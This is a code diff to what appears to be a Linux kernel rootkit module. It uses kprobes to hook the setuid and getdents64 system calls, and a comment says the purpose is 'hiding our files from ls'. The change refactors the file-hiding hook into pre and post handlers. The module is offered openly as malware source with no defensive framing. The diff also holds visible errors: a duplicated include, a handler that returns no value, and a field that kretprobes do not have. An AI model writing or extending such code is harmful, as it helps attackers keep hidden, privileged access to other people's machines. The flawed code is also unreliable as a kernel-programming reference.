@@ -6,6 +6,7 @@
 #include <linux/kprobes.h>
 #include <linux/atomic.h>
 #include <linux/dirent.h>
+#include <linux/uaccess.h>
 
 #include <linux/uaccess.h>
 
@@ -49,7 +50,16 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 }
 /* Hiding our files from ls */
 
-static int __x64_sys_getdents64_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
+/* struct for info to be passed from entry handler to post handler */
+static struct getdents_data{
+    unsigned long d_name_ptr;
+}dentry_data;
+
+static int __x64_sys_getdents64_pre_handler(struct kprobe *getdents_kprobe, struct pt_regs *regs){
+    printk(KERN_INFO "Executing __x64_sys_getdents64_pre_handler... ");
+}
+
+static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 
@@ -107,7 +117,8 @@ done:
     return 0;
 }
 static struct kretprobe  __x64_sys_getdents64_hook= {
-	.handler = __x64_sys_getdents64_handler,
+    .pre_handler = __x64_sys_getdents64_pre_handler,
+	.handler = __x64_sys_getdents64_post_handler,
 	.kp.symbol_name="__x64_sys_getdents64",
 	.maxactive=20,
 };
